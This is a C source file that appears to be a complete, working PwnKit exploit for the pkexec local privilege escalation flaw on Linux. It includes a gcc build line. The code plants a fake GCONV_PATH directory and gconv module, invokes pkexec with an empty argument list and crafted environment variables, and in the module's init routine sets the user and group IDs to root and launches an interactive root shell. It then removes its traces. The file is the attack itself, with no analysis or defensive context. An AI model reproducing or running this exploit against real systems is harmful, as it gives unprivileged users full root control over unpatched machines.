// gcc -shared PwnKit.c -o PwnKit -Wl,-soname,libservice.so -Wl,-e,entry -fPIC

#define _XOPEN_SOURCE 700
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <ftw.h>

#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>

const char service_interp[] __attribute__((section(".interp"))) = "/lib64/ld-linux-x86-64.so.2";

int unlink_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf)
{
    int rv = remove(fpath);

    if (rv)
        perror(fpath);

    return rv;
}

int rmrf(char *path)
{
    return nftw(path, unlink_cb, 64, FTW_DEPTH | FTW_PHYS);
}

void entry(void)
{
    int res, pid, status;
    FILE *fp;
    ssize_t len;
    char exe[PATH_MAX];

    res = mkdir("GCONV_PATH=.", 0777);
    if (res == -1 && errno != EEXIST)
    {
        perror("Failed to create directory");
        _exit(1);
    }

    res = creat("GCONV_PATH=./pkexec", 0777);

    res = mkdir("pkexec", 0777);

    fp = fopen("pkexec/gconv-modules", "w+");
    if (fp == NULL)
    {
        perror("Failed to open output file");
        _exit(1);
    }
    if (fputs("module UTF-8// PKEXEC// pkexec 2", fp) < 0)
    {
        perror("Failed to write config");
        _exit(1);
    }
    fclose(fp);

    exe[readlink("/proc/self/exe", exe, sizeof(exe))] = 0;
    res = symlink(exe, "pkexec/pkexec.so");
    if (res == -1)
    {
        perror("Failed to copy file");
        _exit(1);
    }

    if ((pid = fork()) == 0)
    {
        execve(
            "/usr/bin/pkexec",
            (char *[]){NULL},
            (char *[]){"pkexec", "PATH=GCONV_PATH=.", "CHARSET=pkexec", "SHELL=pkexec", NULL});

        // In case pkexec is not in /usr/bin/
        execvpe(
            "pkexec",
            (char *[]){NULL},
            (char *[]){"pkexec", "PATH=GCONV_PATH=.", "CHARSET=pkexec", "SHELL=pkexec", NULL});

        _exit(0);
    }

    // Cleanup for situations where the exploit didn't work
    wait(NULL);
    rmrf("GCONV_PATH=.");
    rmrf("pkexec");

    _exit(0);
}

void gconv() {}
void gconv_init()
{
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    rmrf("GCONV_PATH=.");
    rmrf("pkexec");

    // Try interactive bash first
    execve("/bin/bash", (char *[]){"-i", NULL}, NULL);

    // In case interactive bash was not possible
    execve("/bin/sh", NULL, NULL);
    _exit(0);
}